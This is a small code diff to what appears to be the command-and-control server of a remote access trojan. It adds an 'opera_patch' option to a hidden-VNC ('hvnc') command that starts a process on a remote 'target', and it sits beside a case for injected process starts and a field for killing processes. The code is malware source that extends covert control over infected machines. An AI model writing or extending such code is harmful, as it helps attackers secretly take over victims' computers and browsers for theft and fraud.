@@ -874,6 +874,7 @@ export function handleHVNCViewerMessage(ws: ServerWebSocket<SocketData>, raw: st
       sendHVNCCommand(target, "hvnc_start_process", {
         path: String(payload.path || ""),
         kill_exe: String(payload.kill_exe || ""),
+        opera_patch: Boolean(payload.opera_patch),
       });
       break;
     case "hvnc_start_process_injected": {
